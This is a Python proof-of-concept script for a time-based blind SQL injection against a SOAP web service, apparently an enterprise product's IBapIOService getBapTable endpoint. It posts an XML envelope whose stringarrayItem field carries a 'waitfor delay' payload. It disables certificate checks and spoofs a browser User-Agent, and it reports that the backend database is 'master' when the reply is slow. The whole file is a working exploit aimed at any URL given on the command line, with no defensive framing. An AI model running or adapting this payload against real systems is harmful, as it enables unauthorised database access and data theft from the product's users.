import requests
import urllib3
urllib3.disable_warnings()
import sys

proxies = {
    # "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0)",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
}

def sqlinjection_poc(url):
    body=f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ibap="http://service.bap.itf.nc/IBapIOService">
   <soapenv:Header/>
   <soapenv:Body>
      <ibap:getBapTable>
         <!--Zero or more repetitions:-->
         <ibap:stringarrayItem>DWQueue@MessageQueue';if 'master'=db_name(1) waitfor delay '0:0:6'--+</ibap:stringarrayItem>
      </ibap:getBapTable>
   </soapenv:Body>
</soapenv:Envelope>
'''
    rsp = requests.post(url, data=body, headers=headers, timeout=30, verify=False, proxies=proxies)
    if rsp.elapsed.total_seconds() > 5:
        print("db_name(1)=master")
        sys.exit(0)

if __name__ == '__main__':
    sqlinjection_poc(sys.argv[1])
